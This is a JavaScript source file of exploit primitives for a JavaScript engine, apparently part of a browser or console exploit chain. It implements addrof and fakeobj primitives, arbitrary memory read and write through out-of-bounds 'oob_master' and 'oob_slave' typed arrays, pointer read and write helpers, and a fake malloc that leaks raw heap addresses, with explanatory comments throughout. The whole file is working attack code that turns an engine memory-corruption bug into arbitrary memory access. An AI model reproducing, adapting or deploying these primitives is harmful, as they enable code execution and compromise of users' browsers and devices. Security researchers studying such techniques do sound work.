function i48_put(x, a) {
  a[4] = x | 0;
  a[5] = (x / 4294967296) | 0;
}

function i48_get(a) {
  return a[4] + a[5] * 4294967296;
}
// addrof Primitive
function addrof(x) {
  leaker_obj.a = x;
  return i48_get(leaker_arr);
}
// fakeobj Primitive
function fakeobj(x) {
  i48_put(x, leaker_arr);
  return leaker_obj.a;
}

function read_mem_setup(p, sz) {
  i48_put(p, oob_master);
  oob_master[6] = sz;
}

//
// Function calls the read_mem_setup function to prepare 
// memory for read/write operations. 
//
// Then it reads (sz) number of bytes from oob_slave
// and adds them to an array (ans). When done the (ans)
// array will be returned.
//
function read_mem(p, sz) {
  read_mem_setup(p, sz);
  var arr = [];
  for (var i = 0; i < sz; i++) arr.push(oob_slave[i]);
  return arr;
}

//
// Function calls the read_mem_setup function to prepare 
// memory for read/write operations. 
//
// Then the contents of oob_slave is returned in the
// form of an string.
//
function read_mem_s(p, sz) {
  read_mem_setup(p, sz);
  return "" + oob_slave;
}

//
// Function calls the read_mem_setup function to prepare 
// memory for read/write operations. 
//
// Then (sz) number of bytes is read from the oob_slave
// array and stored in a new Uint8Array instance before
// it is returned. 
//
function read_mem_b(p, sz) {
  read_mem_setup(p, sz);
  var b = new Uint8Array(sz);
  b.set(oob_slave);
  return b;
}

//
// Function used for reading and converting memory to plaintext.
// Summary:
// First (sz) number of bytes is read from (p), then the read bytes will 
// be converted to it's human-readable plaintext version, before being 
// returned.
//
function read_mem_as_string(p, sz) {
  let bytes = read_mem_b(p, sz);
  return String.fromCharCode(...bytes);;
}

//
// Function is used for writing data to the oob slave array
// of which is related to the oob master array, both of which
// are used after obtaining arbitrary memory read/write.
// 
// The function will write (length of data argument) number of
// bytes from (data) to the (oob_slave) array.
//
function write_mem(p, data) {
  i48_put(p, oob_master);
  oob_master[6] = data.length;
  oob_slave.set(data);
}

//
// To be added... 
//
function read_ptr_at(p) {
  var ans = 0;
  var d = read_mem(p, 8);
  for (var i = 7; i >= 0; i--) {
    ans = 256 * ans + d[i];
  }
  return ans;
}

//
// To be added... 
//
function write_ptr_at(p, d) {
  var arr = [];
  for (var i = 0; i < 8; i++) {
    arr.push(d & 0xff);
    d /= 256;
  }
  write_mem(p, arr);
}

//
// Function is used to convert a regular (ex: decimal-type)
// number into its 16-bit hexadecimal value and return it. 
//
function to_hex(x) {
  return Number(x).toString(16);
}

// This array allows for the creation and storing of unsigned
// 8-bit integer arrays, without having to worry about garbage
// collection. 

// Hence the (_nogc) at the end, meaning (no garbage collection)
// To "deallocate" hehe, stored arrays u simply call pop() and 
// it will pop the last "allocated" array.
var malloc_nogc = [];

//
// This is not the C-Related malloc (memoryallocate) function but
// instead a simple implementation which allows for "allocating"
// and/or creating arrays of custom (sz) size, and adding them to
// the malloc_nogc array to prevent garbage collection.
//
// Once a new Uint8Array (Unsigned 8-bit integer array) the size
// of (sz) argument is created, it is then pushed/added to the 
// malloc_nogc array, then the returned value of read_ptr_at with
// the resulted value of the following being passed as the (x) param:
//    Return value of addrof(<newarrayinstance>)) +
//    0x10 (16)
// 
// is finally returned by our malloc
//
function malloc(sz) {
  var arr = new Uint8Array(sz);
  malloc_nogc.push(arr);
  return read_ptr_at(addrof(arr) + 0x10);
}
